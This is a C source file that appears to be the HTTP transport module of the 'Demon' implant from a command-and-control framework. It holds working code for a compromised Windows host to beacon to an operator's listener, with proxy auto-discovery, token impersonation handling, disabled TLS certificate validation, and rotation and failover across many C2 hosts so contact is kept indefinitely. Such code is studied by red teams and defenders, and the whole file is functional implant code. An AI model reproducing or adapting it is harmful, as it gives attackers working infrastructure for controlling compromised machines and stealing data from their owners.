#include <Demon.h>

#include <core/TransportHttp.h>
#include <core/MiniStd.h>

#ifdef TRANSPORT_HTTP

/*!
 * @brief
 *  send a http request
 *
 * @param Send
 *  buffer to send
 *
 * @param Resp
 *  buffer response
 *
 * @return
 *  if successful send request
 */
BOOL HttpSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
) {
    HANDLE  Connect        = { 0 };
    HANDLE  Request        = { 0 };
    LPWSTR  HttpHeader     = { 0 };
    LPWSTR  HttpEndpoint   = { 0 };
    DWORD   HttpFlags      = { 0 };
    LPCWSTR HttpProxy      = { 0 };
    PWSTR   HttpScheme     = { 0 };
    DWORD   Counter        = { 0 };
    DWORD   Iterator       = { 0 };
    DWORD   BufRead        = { 0 };
    UCHAR   Buffer[ 1024 ] = { 0 };
    PVOID   RespBuffer     = { 0 };
    SIZE_T  RespSize       = { 0 };
    BOOL    Successful     = { 0 };

    WINHTTP_PROXY_INFO                   ProxyInfo        = { 0 };
    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig      = { 0 };
    WINHTTP_AUTOPROXY_OPTIONS            AutoProxyOptions = { 0 };

    /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
    TokenImpersonate( FALSE );

    /* if we don't have any more hosts left, then exit */
    if ( ! ((INSTANCE *)Instance)->Config.Transport.Host ) {
        PUTS_DONT_SEND( "No hosts left to use... exit now." )
        CommandExit( NULL );
    }

    if ( ! ((INSTANCE *)Instance)->hHttpSession ) {
        if ( ((INSTANCE *)Instance)->Config.Transport.Proxy.Enabled ) {
            // Use preconfigured proxy
            HttpProxy = ((INSTANCE *)Instance)->Config.Transport.Proxy.Url;

            /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NAMED_PROXY, %ls, WINHTTP_NO_PROXY_BYPASS, 0 )\n", ((INSTANCE *)Instance)->Config.Transport.UserAgent, HttpProxy ) */
            ((INSTANCE *)Instance)->hHttpSession = ((INSTANCE *)Instance)->Win32.WinHttpOpen( ((INSTANCE *)Instance)->Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NAMED_PROXY, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
        } else {
            // Autodetect proxy settings
            /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 )\n", ((INSTANCE *)Instance)->Config.Transport.UserAgent ) */
            ((INSTANCE *)Instance)->hHttpSession = ((INSTANCE *)Instance)->Win32.WinHttpOpen( ((INSTANCE *)Instance)->Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
        }

        if ( ! ((INSTANCE *)Instance)->hHttpSession ) {
            PRINTF_DONT_SEND( "WinHttpOpen: Failed => %d\n", NtGetLastError() )
            goto LEAVE;
        }
    }

    /* PRINTF_DONT_SEND( "WinHttpConnect( %x, %ls, %d, 0 )\n", ((INSTANCE *)Instance)->hHttpSession, ((INSTANCE *)Instance)->Config.Transport.Host->Host, ((INSTANCE *)Instance)->Config.Transport.Host->Port ) */
    if ( ! ( Connect = ((INSTANCE *)Instance)->Win32.WinHttpConnect(
        ((INSTANCE *)Instance)->hHttpSession,
        ((INSTANCE *)Instance)->Config.Transport.Host->Host,
        ((INSTANCE *)Instance)->Config.Transport.Host->Port,
        0
    ) ) ) {
        PRINTF_DONT_SEND( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
        goto LEAVE;
    }

    while ( TRUE ) {
        if ( ! ((INSTANCE *)Instance)->Config.Transport.Uris[ Counter ] ) {
            break;
        } else {
            Counter++;
        }
    }

    HttpEndpoint = ((INSTANCE *)Instance)->Config.Transport.Uris[ RandomNumber32() % Counter ];
    HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

    if ( ((INSTANCE *)Instance)->Config.Transport.Secure ) {
        HttpFlags |= WINHTTP_FLAG_SECURE;
    }

    /* PRINTF_DONT_SEND( "WinHttpOpenRequest( %x, %ls, %ls, NULL, NULL, NULL, %x )\n", hConnect, ((INSTANCE *)Instance)->Config.Transport.Method, HttpEndpoint, HttpFlags ) */
    if ( ! ( Request = ((INSTANCE *)Instance)->Win32.WinHttpOpenRequest(
        Connect,
        ((INSTANCE *)Instance)->Config.Transport.Method,
        HttpEndpoint,
        NULL,
        NULL,
        NULL,
        HttpFlags
    ) ) ) {
        PRINTF_DONT_SEND( "WinHttpOpenRequest: Failed => %d\n", NtGetLastError() )
        goto LEAVE;
    }

    if ( ((INSTANCE *)Instance)->Config.Transport.Secure ) {
        HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        if ( ! ((INSTANCE *)Instance)->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
        {
            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }
    }

    /* Add our headers */
    do {
        HttpHeader = ((INSTANCE *)Instance)->Config.Transport.Headers[ Iterator ];

        if ( ! HttpHeader )
            break;

        if ( ! ((INSTANCE *)Instance)->Win32.WinHttpAddRequestHeaders( Request, HttpHeader, -1, WINHTTP_ADDREQ_FLAG_ADD ) ) {
            PRINTF_DONT_SEND( "Failed to add header: %ls", HttpHeader )
        }

        Iterator++;
    } while ( TRUE );

    if ( ((INSTANCE *)Instance)->Config.Transport.Proxy.Enabled ) {

        // Use preconfigured proxy
        ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
        ProxyInfo.lpszProxy    = ((INSTANCE *)Instance)->Config.Transport.Proxy.Url;

        if ( ! ((INSTANCE *)Instance)->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof( WINHTTP_PROXY_INFO ) ) ) {
            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }

        if ( ((INSTANCE *)Instance)->Config.Transport.Proxy.Username ) {
            if ( ! ((INSTANCE *)Instance)->Win32.WinHttpSetOption(
                Request,
                WINHTTP_OPTION_PROXY_USERNAME,
                ((INSTANCE *)Instance)->Config.Transport.Proxy.Username,
                StringLengthW( ((INSTANCE *)Instance)->Config.Transport.Proxy.Username )
            ) ) {
                PRINTF_DONT_SEND( "Failed to set proxy username %u", NtGetLastError() );
            }
        }

        if ( ((INSTANCE *)Instance)->Config.Transport.Proxy.Password ) {
            if ( ! ((INSTANCE *)Instance)->Win32.WinHttpSetOption(
                Request,
                WINHTTP_OPTION_PROXY_PASSWORD,
                ((INSTANCE *)Instance)->Config.Transport.Proxy.Password,
                StringLengthW( ((INSTANCE *)Instance)->Config.Transport.Proxy.Password )
            ) ) {
                PRINTF_DONT_SEND( "Failed to set proxy password %u", NtGetLastError() );
            }
        }

    } else if ( ! ((INSTANCE *)Instance)->LookedForProxy ) {
        // Autodetect proxy settings using the Web Proxy Auto-Discovery (WPAD) protocol

        /*
         * NOTE: We use WinHttpGetProxyForUrl as the first option because
         *       WinHttpGetIEProxyConfigForCurrentUser can fail with certain users
         *       and also the documentation states that WinHttpGetIEProxyConfigForCurrentUser
         *       "can be used as a fall-back mechanism" so we are using it that way
         */

        AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
        AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
        AutoProxyOptions.lpszAutoConfigUrl      = NULL;
        AutoProxyOptions.lpvReserved            = NULL;
        AutoProxyOptions.dwReserved             = 0;
        AutoProxyOptions.fAutoLogonIfChallenged = TRUE;

        if ( ((INSTANCE *)Instance)->Win32.WinHttpGetProxyForUrl( ((INSTANCE *)Instance)->hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) ) {
            if ( ProxyInfo.lpszProxy ) {
                PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
            }

            ((INSTANCE *)Instance)->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
            ((INSTANCE *)Instance)->ProxyForUrl       = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, ((INSTANCE *)Instance)->SizeOfProxyForUrl );
            MemCopy( ((INSTANCE *)Instance)->ProxyForUrl, &ProxyInfo, ((INSTANCE *)Instance)->SizeOfProxyForUrl );
        } else {
            // WinHttpGetProxyForUrl failed, use WinHttpGetIEProxyConfigForCurrentUser as fall-back
            if ( ((INSTANCE *)Instance)->Win32.WinHttpGetIEProxyConfigForCurrentUser( &ProxyConfig ) ) {
                if ( ProxyConfig.lpszProxy != NULL && StringLengthW( ProxyConfig.lpszProxy ) != 0 ) {
                    // IE is set to "use a proxy server"
                    ProxyInfo.dwAccessType    = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                    ProxyInfo.lpszProxy       = ProxyConfig.lpszProxy;
                    ProxyInfo.lpszProxyBypass = ProxyConfig.lpszProxyBypass;

                    PRINTF_DONT_SEND( "Using IE proxy %ls\n", ProxyInfo.lpszProxy );

                    ((INSTANCE *)Instance)->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                    ((INSTANCE *)Instance)->ProxyForUrl       = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, ((INSTANCE *)Instance)->SizeOfProxyForUrl );
                    MemCopy( ((INSTANCE *)Instance)->ProxyForUrl, &ProxyInfo, ((INSTANCE *)Instance)->SizeOfProxyForUrl );

                    // don't cleanup these values
                    ProxyConfig.lpszProxy       = NULL;
                    ProxyConfig.lpszProxyBypass = NULL;
                } else if ( ProxyConfig.lpszAutoConfigUrl != NULL && StringLengthW( ProxyConfig.lpszAutoConfigUrl ) != 0 ) {
                    // IE is set to "Use automatic proxy configuration"
                    AutoProxyOptions.dwFlags           = WINHTTP_AUTOPROXY_CONFIG_URL;
                    AutoProxyOptions.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
                    AutoProxyOptions.dwAutoDetectFlags = 0;

                    PRINTF_DONT_SEND( "Trying to discover the proxy config via the config url %ls\n", AutoProxyOptions.lpszAutoConfigUrl );

                    if ( ((INSTANCE *)Instance)->Win32.WinHttpGetProxyForUrl( ((INSTANCE *)Instance)->hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) ) {
                        if ( ProxyInfo.lpszProxy ) {
                            PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
                        }

                        ((INSTANCE *)Instance)->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                        ((INSTANCE *)Instance)->ProxyForUrl       = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, ((INSTANCE *)Instance)->SizeOfProxyForUrl );
                        MemCopy( ((INSTANCE *)Instance)->ProxyForUrl, &ProxyInfo, ((INSTANCE *)Instance)->SizeOfProxyForUrl );
                    }
                } else {
                    // IE is set to "automatically detect settings"
                    // ignore this as we already tried
                }
            }
        }

        ((INSTANCE *)Instance)->LookedForProxy = TRUE;
    }

    if ( ((INSTANCE *)Instance)->ProxyForUrl ) {
        if ( ! ((INSTANCE *)Instance)->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, ((INSTANCE *)Instance)->ProxyForUrl, ((INSTANCE *)Instance)->SizeOfProxyForUrl ) ) {
            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }
    }

    /* Send package to our listener */
    if ( ((INSTANCE *)Instance)->Win32.WinHttpSendRequest( Request, NULL, 0, Send->Buffer, Send->Length, Send->Length, 0 ) ) {
        if ( ((INSTANCE *)Instance)->Win32.WinHttpReceiveResponse( Request, NULL ) ) {
            /* Is the server recognizing us ? are we good ?  */
            if ( HttpQueryStatus( Request ) != HTTP_STATUS_OK ) {
                PUTS_DONT_SEND( "HttpQueryStatus Failed: Is not HTTP_STATUS_OK (200)" )
                Successful = FALSE;
                goto LEAVE;
            }

            if ( Resp ) {
                RespBuffer = NULL;

                //
                // read the entire response into the Resp BUFFER
                //
                do {
                    Successful = ((INSTANCE *)Instance)->Win32.WinHttpReadData( Request, Buffer, sizeof( Buffer ), &BufRead );
                    if ( ! Successful || BufRead == 0 ) {
                        break;
                    }

                    if ( ! RespBuffer ) {
                        RespBuffer = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, BufRead );
                    } else {
                        RespBuffer = ((INSTANCE *)Instance)->Win32.LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );
                    }

                    RespSize += BufRead;

                    MemCopy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
                    MemSet( Buffer, 0, sizeof( Buffer ) );
                } while ( Successful == TRUE );

                Resp->Length = RespSize;
                Resp->Buffer = RespBuffer;

                Successful = TRUE;
            }
        }
    } else {
        if ( NtGetLastError() == ERROR_INTERNET_CANNOT_CONNECT ) {
            ((INSTANCE *)Instance)->Session.Connected = FALSE;
        }

        PRINTF_DONT_SEND( "HTTP Error: %d\n", NtGetLastError() )
    }

LEAVE:
    if ( Connect ) {
        ((INSTANCE *)Instance)->Win32.WinHttpCloseHandle( Connect );
    }

    if ( Request ) {
        ((INSTANCE *)Instance)->Win32.WinHttpCloseHandle( Request );
    }

    if ( ProxyConfig.lpszProxy ) {
        ((INSTANCE *)Instance)->Win32.GlobalFree( ProxyConfig.lpszProxy );
    }

    if ( ProxyConfig.lpszProxyBypass ) {
        ((INSTANCE *)Instance)->Win32.GlobalFree( ProxyConfig.lpszProxyBypass );
    }

    if ( ProxyConfig.lpszAutoConfigUrl ) {
        ((INSTANCE *)Instance)->Win32.GlobalFree( ProxyConfig.lpszAutoConfigUrl );
    }

    /* re-impersonate the token */
    TokenImpersonate( TRUE );

    if ( ! Successful ) {
        /* if we hit our max then we use our next host */
        ((INSTANCE *)Instance)->Config.Transport.Host = HostFailure( ((INSTANCE *)Instance)->Config.Transport.Host );
    }

    return Successful;
}

/*!
 * @brief
 *  Query the Http Status code from the request response.
 *
 * @param hRequest
 *  request handle
 *
 * @return
 *  Http status code
 */
DWORD HttpQueryStatus(
    _In_ HANDLE Request
) {
    DWORD StatusCode = 0;
    DWORD StatusSize = sizeof( DWORD );

    if ( ((INSTANCE *)Instance)->Win32.WinHttpQueryHeaders(
        Request,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &StatusCode,
        &StatusSize,
        WINHTTP_NO_HEADER_INDEX
    ) ) {
        return StatusCode;
    }

    return 0;
}

PHOST_DATA HostAdd(
    _In_ LPWSTR Host, SIZE_T Size, DWORD Port )
{
    PRINTF_DONT_SEND( "Host -> Host:[%ls] Size:[%ld] Port:[%ld]\n", Host, Size, Port );

    PHOST_DATA HostData = NULL;

    HostData       = MmHeapAlloc( sizeof( HOST_DATA ) );
    HostData->Host = MmHeapAlloc( Size + sizeof( WCHAR ) );
    HostData->Port = Port;
    HostData->Dead = FALSE;
    HostData->Next = ((INSTANCE *)Instance)->Config.Transport.Hosts;

    /* Copy host to our buffer */
    MemCopy( HostData->Host, Host, Size );

    /* Add to hosts linked list */
    ((INSTANCE *)Instance)->Config.Transport.Hosts = HostData;

    return HostData;
}

PHOST_DATA HostFailure( PHOST_DATA Host )
{
    if ( ! Host )
        return NULL;

    if ( Host->Failures == ((INSTANCE *)Instance)->Config.Transport.HostMaxRetries )
    {
        /* we reached our max failed retries with our current host data
         * use next one */
        Host->Dead = TRUE;

        /* Get our next host based on our rotation strategy. */
        return HostRotation( ((INSTANCE *)Instance)->Config.Transport.HostRotation );
    }

    /* Increase our failed counter */
    Host->Failures++;

    PRINTF_DONT_SEND( "Host [Host: %ls:%ld] failure counter increased to %d\n", Host->Host, Host->Port, Host->Failures )

    return Host;
}

/* Gets a random host from linked list. */
PHOST_DATA HostRandom()
{
    PHOST_DATA Host  = NULL;
    DWORD      Index = RandomNumber32() % HostCount();
    DWORD      Count = 0;

    Host = ((INSTANCE *)Instance)->Config.Transport.Hosts;

    for ( ;; )
    {
        if ( Count == Index )
            break;

        if ( ! Host )
            break;

        /* if we are the end and still didn't found the random index quit. */
        if ( ! Host->Next )
        {
            Host = NULL;
            break;
        }

        Count++;

        /* Next host please */
        Host = Host->Next;
    }

    PRINTF_DONT_SEND( "Index: %d\n", Index )
    PRINTF_DONT_SEND( "Host : %p (%ls:%ld :: Dead[%s] :: Failures[%d])\n", Host, Host->Host, Host->Port, Host->Dead ? "TRUE" : "FALSE", Host->Failures )

    return Host;
}

PHOST_DATA HostRotation( SHORT Strategy )
{
    PHOST_DATA Host = NULL;

    if ( ((INSTANCE *)Instance)->Config.Transport.NumHosts > 1 )
    {
        /*
         * Different CDNs can have different WPAD rules.
         * After rotating, look for the proxy again
         */
        ((INSTANCE *)Instance)->LookedForProxy = FALSE;
    }

    if ( Strategy == TRANSPORT_HTTP_ROTATION_ROUND_ROBIN )
    {
        DWORD Count = 0;

        /* get linked list */
        Host = ((INSTANCE *)Instance)->Config.Transport.Hosts;

        /* If our current host is empty
         * then return the top host from our linked list. */
        if ( ! ((INSTANCE *)Instance)->Config.Transport.Host )
            return Host;

        for ( Count = 0; Count < HostCount();  )
        {
            /* check if it's not an empty pointer */
            if ( ! Host )
                break;

            /* if the host is dead (max retries limit reached) then continue */
            if ( Host->Dead )
                Host = Host->Next;
            else break;
        }
    }
    else if ( Strategy == TRANSPORT_HTTP_ROTATION_RANDOM )
    {
        /* Get a random Host */
        Host = HostRandom();

        /* if we fail use the first host we get available. */
        if ( Host->Dead )
            /* fallback to Round Robin */
            Host = HostRotation( TRANSPORT_HTTP_ROTATION_ROUND_ROBIN );
    }

    /* if we specified infinite retries then reset every "Failed" retries in our linked list and do this forever...
     * as the operator wants. */
    if ( ( ((INSTANCE *)Instance)->Config.Transport.HostMaxRetries == 0 ) && ! Host )
    {
        PUTS_DONT_SEND( "Specified to keep going. To infinity... and beyond" )

        /* get linked list */
        Host = ((INSTANCE *)Instance)->Config.Transport.Hosts;

        /* iterate over linked list */
        for ( ;; )
        {
            if ( ! Host )
                break;

            /* reset failures */
            Host->Failures = 0;
            Host->Dead     = FALSE;

            Host = Host->Next;
        }

        /* tell the caller to start at the beginning */
        Host = ((INSTANCE *)Instance)->Config.Transport.Hosts;
    }

    return Host;
}

DWORD HostCount()
{
    PHOST_DATA Host  = NULL;
    PHOST_DATA Head  = NULL;
    DWORD      Count = 0;

    Head = ((INSTANCE *)Instance)->Config.Transport.Hosts;
    Host = Head;

    do {

        if ( ! Host )
            break;

        Count++;

        Host = Host->Next;

        /* if we are at the beginning again then stop. */
        if ( Head == Host )
            break;

    } while ( TRUE );

    return Count;
}

BOOL HostCheckup()
{
    PHOST_DATA Host  = NULL;
    PHOST_DATA Head  = NULL;
    DWORD      Count = 0;
    BOOL       Alive = TRUE;

    Head = ((INSTANCE *)Instance)->Config.Transport.Hosts;
    Host = Head;

    do {
        if ( ! Host )
            break;

        if ( Host->Dead )
            Count++;

        Host = Host->Next;

        /* if we are at the beginning again then stop. */
        if ( Head == Host )
            break;
    } while ( TRUE );

    /* check if every host is dead */
    if ( HostCount() == Count )
        Alive = FALSE;

    return Alive;
}
#endif
